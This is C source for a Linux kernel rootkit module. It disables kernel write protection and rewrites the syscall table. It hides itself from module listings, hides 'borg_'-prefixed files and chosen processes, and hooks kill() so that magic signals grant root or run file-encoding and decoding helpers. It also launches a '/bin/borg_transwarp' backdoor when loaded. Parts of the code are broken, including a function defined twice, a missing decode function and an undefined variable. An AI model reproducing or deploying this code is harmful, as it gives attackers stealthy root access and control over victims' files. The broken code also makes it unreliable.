#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/dirent.h>

#include <linux/version.h>
#include <linux/sched.h>
#include <linux/syscalls.h>


#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>
#else
#include <linux/proc_fs.h>
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>
#else
#include <linux/fdtable.h>
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>
#endif

#ifndef __NR_getdents
#define __NR_getdents 141
#endif

#define PREFIX "borg_"
#define DOOR "/bin/borg_transwarp"
#define ENC "/bin/borg_enc"
#define DEC "/bin/borg_dec"
#define PF_INVISIBLE 0x10000000

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};
#endif


#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
typedef asmlinkage long(*ptregs_t)(const struct pt_regs *regs);
#endif

#ifdef PTREGS_SYSCALL_STUBS
static ptregs_t orig_kill;
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);
#else
typedef asmlinkage long(*orig_kill_t)(pid_t pid, int sig);
orig_kill_t orig_kill;
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
#endif



unsigned long *__sys_call_table = NULL;

char hide_pid[NAME_MAX]; 



static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;

    /* __asm__ __volatile__( */
    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void) {
    write_cr0_forced(read_cr0() | (0x10000));
}

static inline void unprotect_memory(void) {
    write_cr0_forced(read_cr0() & (~0x10000));
}


static unsigned long *get_syscall_table(void) {
	unsigned long* syscall_table = NULL;
	#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
		#ifdef KPROBE_LOOKUP
    			typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    			kallsyms_lookup_name_t kallsyms_lookup_name;
    			register_kprobe(&kp);
    			kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    			unregister_kprobe(&kp);
		#endif
		syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	
	#else
        for (i = (unsigned long int)sys_close; i < ULONG_MAX;
                        i += sizeof(void *)) {
                syscall_table = (unsigned long *)i;

                if (syscall_table[__NR_close] == sys_close)
                        return syscall_table;
        }
	#endif
	return(syscall_table);
}

static int enable_transwarp(void){
	char *argv[] = { DOOR, NULL, NULL };
	static char *envp[] = {
		"HOME=/",
		"TERM=xterm",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}

static int encode_files(void){
	char *argv[] = { ENC, NULL, NULL };
	static char *envp[] = {
		"HOME=/",
		"TERM=xterm",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
static int encode_files(void){
	char *argv[] = { DEC, NULL, NULL };
	static char *envp[] = {
		"HOME=/",
		"TERM=xterm",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
}
struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};
#ifndef IS_ENABLED
#define IS_ENABLED(option) \
(defined(__enabled_ ## option) || defined(__enabled_ ## option ## _MODULE))
#endif
struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

void set_root(void)
{
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}


static void __init hide_myself(void)
{
    struct vmap_area *va, *vtmp;
    struct module_use *use, *tmp;
    struct list_head *_vmap_area_list;
    struct rb_root *_vmap_area_root;

#ifdef KPROBE_LOOKUP
    unsigned long (*kallsyms_lookup_name)(const char *name);
    if (register_kprobe(&kp) < 0)
        return;
    kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
    unregister_kprobe(&kp);
#endif

    _vmap_area_list =
        (struct list_head *) kallsyms_lookup_name("vmap_area_list");
    _vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");

    /* hidden from /proc/vmallocinfo */
    list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
        if ((unsigned long) THIS_MODULE > va->va_start &&
            (unsigned long) THIS_MODULE < va->va_end) {
            list_del(&va->list);
            /* remove from red-black tree */
            rb_erase(&va->rb_node, _vmap_area_root);
        }
    }

    /* hidden from /proc/modules */
    list_del_init(&THIS_MODULE->list);

    /* hidden from /sys/modules */
    kobject_del(&THIS_MODULE->mkobj.kobj);

    /* decouple the dependency */
    list_for_each_entry_safe (use, tmp, &THIS_MODULE->target_list,
                              target_list) {
        list_del(&use->source_list);
        list_del(&use->target_list);
        sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
        kfree(use);
    }
}


#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);
    struct task_struct *task;
    int sig = regs->si;
    pid_t pid = regs->di;

    if (sig == 64)
    {
        set_root();
        return 0;
    }
    else if(sig == 63) { // hide pid
        //sprintf(hide_pid, "%d", pid);
        if ((task = find_task(pid)) == NULL) return -ESRCH;
                task->flags ^= PF_INVISIBLE;
	return(0);
    }
	else if(sig==62) {
		encode_files();
		return(0);
	}
	else if(sig==61) {
		decode_files();
		return(0);
	}
    return orig_kill(regs);
}
#else
int hook_kill(pid_t pid, int sig)
{
    void set_root(void);
    struct task_struct *task;
    if (sig == -64)
    {
        set_root();
        return 0;
    }
    else if(sig == -63) { // hide pid
        //sprintf(hide_pid, "%d", pid);
        if ((task = find_task(pid)) == NULL) return -ESRCH;
		task->flags ^= PF_INVISIBLE;
	return(0);
    }
	else if(sig==-62) {
		encode_files();
		return(0);
	}
	else if(sig==-61) {
		decode_files();
		return(0);
	}

    return orig_kill(regs);
}
#endif

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int hook_getdents64(const struct pt_regs *pt_regs)
{
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents64(pt_regs), err;
    unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc &&
		(memcmp(PREFIX, dir->d_name, strlen(PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

asmlinkage int hook_getdents(const struct pt_regs *pt_regs)
{
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
	int fd = (int) pt_regs->di;
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
#elif IS_ENABLED(CONFIG_ARM64)
		int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
	int ret = orig_getdents(pt_regs), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(PREFIX, dir->d_name, strlen(PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;

}
#else

static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc &&
		(memcmp(PREFIX, dir->d_name, strlen(PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(PREFIX, dir->d_name, strlen(PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}
#endif

static int hook(void) {
	__sys_call_table[__NR_kill] = (unsigned long)&hook_kill;
	__sys_call_table[__NR_getdents] = (unsigned long)&hook_getdents;
	#ifdef __NR_getdents64
	__sys_call_table[__NR_getdents64] = (unsigned long)&hook_getdents64;
	#endif
	return(0);
}

static int store(void) {
	#ifdef PTREGS_SYSCALL_STUBS
		orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
		orig_getdents=(ptregs_t)__sys_call_table[__NR_getdents];
		#ifdef __NR_getdents64
			orig_getdents64 = (ptregs_t)__sys_call_table[__NR_getdents64];
		#endif
	#else
		orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
		orig_getdents=(orig_getdents_t)__sys_call_table[__NR_getdents];
		#ifdef __NR_getdents64
			orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
		#endif
	#endif
	return(0);
}


static int cleanup(void) {
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	#ifdef __NR_getdents64
		__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	#endif
	return(1);
}

int init_module_(void) {
	__sys_call_table = (unsigned long*)get_syscall_table();
	printk(KERN_INFO "rk: 60, 61, 62(gr, hp, sp)\n");
	if(!__sys_call_table) {
		return(-1);
	}
	hide_myself();
	store();
	unprotect_memory();
	hook();
	protect_memory();
	enable_transwarp();
	return(0);
}

void exit_module_(void) {
	cleanup();
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Terraminator");

module_init(init_module_);
module_exit(exit_module_);
